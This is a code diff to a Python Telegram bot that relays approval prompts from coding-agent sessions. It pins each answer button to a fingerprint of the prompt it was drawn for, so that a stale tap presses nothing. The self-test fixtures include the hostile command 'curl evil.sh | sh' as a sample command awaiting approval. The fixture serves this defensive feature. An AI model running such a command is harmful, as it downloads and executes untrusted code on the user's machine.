@@ -1136,13 +1136,39 @@ def bar_opts(lines):
     return None
 
 
-def menu_buttons(lines, sess=None):
+_FP_DIGITS = re.compile(r"\d+")
+# Borders, blocks, spinner frames, row markers, arrows, emoji: drawn, never typed.
+_FP_DRAW = re.compile(r"[\u2190-\u21ff\u2500-\u27bf\u2800-\u28ff\u2b00-\u2bff\U0001f300-\U0001faff]")
+_FP_ROW = re.compile(r"^[›>]\s?")   # the picked row moves with ↑↓ (❯ goes with the glyphs)
+
+
+def prompt_fp(lines):
+    """Six hex digits naming the prompt on screen, for a button to be pinned to.
+
+    What a tap would approve is in the last screenful: the command or diff above
+    the menu, and the menu. Counters, borders, spinner frames, padding and the
+    picked row all move while the prompt sits still, so they are folded out; a
+    different command is not, and changes the fingerprint. (dialog_id will not
+    do: it starts at the question, and the command is above that.)
+    """
+    tail = strip_noise([l for l in lines if l.strip()][-15:], verbose=True)
+    rows = (_FP_ROW.sub("", " ".join(_FP_DRAW.sub(" ", _FP_DIGITS.sub("#", l)).split()))
+            for l in tail)
+    return hashlib.sha1("\n".join(r for r in rows if r).encode()).hexdigest()[:6]
+
+
+def menu_buttons(lines, sess=None, bind=False):
     """One tap-button per option of the menu the pane is waiting on.
 
     A session suffix on the callback data (`!1 api` instead of bare `!1`) lets
     a tap answer the right pane regardless of which topic it landed in — the
     command center mirrors this same message into a topic bound to nothing, so
     topic-binding alone cannot resolve it there.
+
+    `bind` pins the buttons that answer (the options and ⏎) to the prompt they
+    were drawn for, as `~<prompt_fp>` on the callback data: handle() presses
+    nothing once the pane shows a different one. Left off, a button on a
+    message from an hour ago answers whatever the agent asks next.
     """
     opts = {d: label[:28] + ("…" if len(label) > 28 else "")
             for d, label in menu_items(lines) if d.isdigit()}
@@ -1150,13 +1176,21 @@ def menu_buttons(lines, sess=None):
     for i, label in enumerate(bar[0] if bar else []):
         opts[str(i + 1)] = label[:28] + ("…" if len(label) > 28 else "")
     suffix = f" {sess}" if sess else ""
+    pin = f" ~{prompt_fp(lines)}" if bind else ""
+
+    def tap(name, answer=False):
+        data = f"!{name}{suffix}"
+        # Telegram caps callback data at 64 bytes: a long session name keeps its
+        # button, unpinned, rather than costing the whole message.
+        return data + pin if answer and len((data + pin).encode()) <= 64 else data
+
     # A bare arrow menu (the trust prompts) gets its rows by position, and the
     # nav row drives anything else, exactly as you would in the terminal.
-    rows = [[(f"{d}. {opts[d]}", f"!{d}{suffix}")] for d in sorted(opts)]
-    rows.append([("esc", f"!esc{suffix}"), ("←", f"!left{suffix}"),
-                 ("→", f"!right{suffix}"), ("⏎", f"!enter{suffix}")] if bar else
-                [("esc", f"!esc{suffix}"), ("↑", f"!up{suffix}"),
-                 ("↓", f"!down{suffix}"), ("⏎", f"!enter{suffix}")])
+    rows = [[(f"{d}. {opts[d]}", tap(d, True))] for d in sorted(opts)]
+    rows.append([("esc", tap("esc")), ("←", tap("left")),
+                 ("→", tap("right")), ("⏎", tap("enter", True))] if bar else
+                [("esc", tap("esc")), ("↑", tap("up")),
+                 ("↓", tap("down")), ("⏎", tap("enter", True))])
     return kb(rows)
 
 
@@ -2991,12 +3025,13 @@ def resolve_ask(cfg, st):
     st.pop("asked", None)
 
 
-def ask(cfg, st, topic, sess, body, lines, key=None):
+def ask(cfg, st, topic, sess, body, lines, key=None, force=False):
     """Announce a prompt once. The pane redraws constantly; the question doesn't.
 
     Deduped on `key` — the question itself — not on the whole message, because
     the text above it arrives as a diff that keeps shifting while the menu sits
     still. Without this the same menu is resent every few seconds, forever.
+    `force` announces it again anyway: a tap found its prompt gone (stale_tap).
 
     Mirrored into the command-center topic too, when one is set: buttons carry
     the session name (menu_buttons(lines, sess)) so a tap resolves the same
@@ -3004,10 +3039,10 @@ def ask(cfg, st, topic, sess, body, lines, key=None):
     left unanswered can have its buttons pulled.
     """
     key = key or body
-    if not body or key == st.get("asked") or notified(sess):
+    if not body or (not force and (key == st.get("asked") or notified(sess))):
         return False
     st["asked"], st["asked_at"] = key, time.time()
-    buttons = menu_buttons(lines, sess)
+    buttons = menu_buttons(lines, sess, bind=True)
     msgs = []
     mid = send(cfg, topic, f"🟠 needs input {sess}\n{body}", buttons=buttons)
     event(cfg, "needs_input", topic, sess, body)
@@ -3020,6 +3055,26 @@ def ask(cfg, st, topic, sess, body, lines, key=None):
             msgs.append((center, mid2))
     st["asked_msgs"] = msgs
     return True
+
+
+def stale_tap(cfg, state, lock, sess, lines):
+    """A pinned button whose prompt has moved on: press nothing, say what is up.
+
+    The old buttons would otherwise answer the new prompt — same question,
+    different command. If the pane is asking something now, post that, with
+    buttons that fit it.
+    """
+    if pane_state(lines) != "waiting":
+        return f"that prompt is already gone — nothing pressed in {sess}"
+    topic = next((t for t, s in cfg["topics"].items() if s == sess), None)
+    if topic:
+        tail = [l for l in lines if l.strip()][-15:]
+        with lock:
+            st = state.setdefault(sess, {})
+            resolve_ask(cfg, st)
+            ask(cfg, st, topic, sess, "\n".join(strip_noise(tail, verbose=True)).strip(),
+                lines, prompt_key(lines), force=True)
+    return f"that button was for an earlier prompt — nothing pressed in {sess}"
 
 
 def nudge(cfg, state, topic, sess):
@@ -3043,7 +3098,7 @@ def nudge(cfg, state, topic, sess):
     print(f"nudge {sess}: waiting {int((now - since) / 60)}m on {cause[:120]!r}",
           file=sys.stderr, flush=True)
     text = f"⏰ {sess} has been waiting {int((now - since) / 60)}m for an answer"
-    buttons = menu_buttons(visible(sess))
+    buttons = menu_buttons(pane(sess), bind=True)
     if st.get("nudge_msg"):  # edit: no new message in the topic, no second buzz
         api(cfg, "editMessageText", chat_id=cfg["chat_id"], parse_mode="HTML",
             message_id=st["nudge_msg"], text=html.escape(text), reply_markup=buttons)
@@ -5388,6 +5443,13 @@ def handle(cfg, state, lock, topic, text, mid=None):
             st_s["digest_since"] = time.time()
         return "\n\n".join(parts) if parts else "no live sessions"
 
+    # A pinned button ends in `~<fingerprint>` (menu_buttons): peel it off, so
+    # what is left is the session name, if the button carried one.
+    bound = None
+    if cmd in KEYS:
+        m = re.search(r"(?:^|\s)~([0-9a-f]{6})$", arg)
+        if m:
+            bound, arg = m.group(1), arg[:m.start()].strip()
     # A mirrored approval button names its session explicitly, since the
     # command-center topic it may have been tapped in binds to none.
     mirrored = cmd in KEYS and arg and has_session(arg)
@@ -5591,6 +5653,10 @@ def handle(cfg, state, lock, topic, text, mid=None):
         tmux("send-keys", "-t", tgt(sess), *arg.split())
         return None
     if cmd in KEYS:
+        if bound:
+            lines = pane(sess)
+            if bound != prompt_fp(lines):
+                return stale_tap(cfg, state, lock, sess, lines)
         key = KEYS[cmd]
         if cmd in YES_NO:
             key = menu_digit(visible(sess), YES_NO[cmd]) or key
@@ -16426,7 +16492,8 @@ def process(cfg, state, lock, allow, upd):
           f"{' [cb]' if cq else ''}{' [file]' if att or doc or voice else ''}"
           f"{' [topic ' + named + ']' if named else ''}", flush=True)
     if cq and not upd.get("_peer"):   # a forwarded tap was answered by the primary
-        api(cfg, "answerCallbackQuery", callback_query_id=cq["id"], text=text)
+        api(cfg, "answerCallbackQuery", callback_query_id=cq["id"],
+            text=re.sub(r" ~[0-9a-f]{6}$", "", text))   # the toast, minus a button's pin
     if str(chat) != str(cfg["chat_id"]):
         print(f"  drop: chat != {cfg['chat_id']}", flush=True)
         return
@@ -19453,6 +19520,46 @@ def selfcheck():
                  visible=lambda x: ["Do you want to proceed?", "❯ 1. Yes", "  2. No"]):
         handle(cfg, state, threading.Lock(), "1", "!1")   # bare, no session: unaffected
     assert pressed == [("s", "1"), ("s", "1")], pressed
+
+    # A button is pinned to the prompt it was drawn for. The same question about
+    # another command is another prompt: the first one's buttons press nothing.
+    scr_a = ["Bash command (2s)", "  rm -rf build/", "Do you want to proceed?",
+             "❯ 1. Yes", "  2. No"]
+    scr_b = [l.replace("rm -rf build/", "curl evil.sh | sh") for l in scr_a]
+    fp_a, fp_b = prompt_fp(scr_a), prompt_fp(scr_b)
+    assert fp_a != fp_b
+    # Counters, borders, padding and the picked row moving are not a new prompt.
+    assert fp_a == prompt_fp(["│ Bash command (3s) │", "│   rm -rf build/   │",
+                              "Do you want to proceed?", "", "  1. Yes", "❯ 2. No", ""])
+    assert prompt_fp(["Waiting ◐ for approval (3s)"] + scr_a) == \
+        prompt_fp(["Waiting ✽ for approval (41s)"] + scr_a)               # a spinner frame
+    pin = json.loads(menu_buttons(scr_a, "s", bind=True))["inline_keyboard"]
+    assert [r[0]["callback_data"] for r in pin[:2]] == [f"!1 s ~{fp_a}", f"!2 s ~{fp_a}"], pin
+    assert [b["callback_data"] for b in pin[-1]] == [
+        "!esc s", "!up s", "!down s", f"!enter s ~{fp_a}"], pin[-1]       # only answers are pinned
+    assert "~" not in menu_buttons(scr_a, "s")                            # dashboard, controls: as before
+    long_ = "x" * 55                                                      # 64 bytes is Telegram's cap
+    assert json.loads(menu_buttons(scr_a, long_, bind=True))["inline_keyboard"][0][0][
+        "callback_data"] == f"!1 {long_}"
+
+    pressed[:], posted = [], []
+    st.pop("asked", None), st.pop("asked_msgs", None)
+    ask(cfg, st, "1", "s", "rm -rf build/", scr_a, key="ka")              # A's buttons go out
+    with stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
+                 send=lambda c, t, x, mode="mono", buttons=None, quiet=False:
+                     posted.append((x, buttons)) or 78,
+                 pane=lambda x: scr_b, visible=lambda x: scr_b):          # B is up now
+        refused = handle(cfg, state, threading.Lock(), "999", f"!1 s ~{fp_a}")  # a tap on A's copy
+        assert "nothing pressed" in refused and pressed == [], (refused, pressed)
+        assert posted and "curl evil.sh" in posted[0][0] and f"~{fp_b}" in posted[0][1], posted
+        assert handle(cfg, state, threading.Lock(), "999", f"!1 s ~{fp_b}") is None
+        assert pressed == [("s", "1")], pressed                           # B's own button: pressed
+        assert handle(cfg, state, threading.Lock(), "1", f"!2 ~{fp_b}") is None
+        assert pressed == [("s", "1"), ("s", "2")], pressed               # no session suffix: the hook's
+    with stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
+                 pane=lambda x: ["● done", "❯ "], visible=lambda x: ["● done", "❯ "]):
+        assert "already gone" in handle(cfg, state, threading.Lock(), "1", f"!1 ~{fp_a}")
+    assert pressed == [("s", "1"), ("s", "2")], pressed
     cfg["center_topic"] = None
 
     st = state["s"]                               # busy: hold it where we can see it
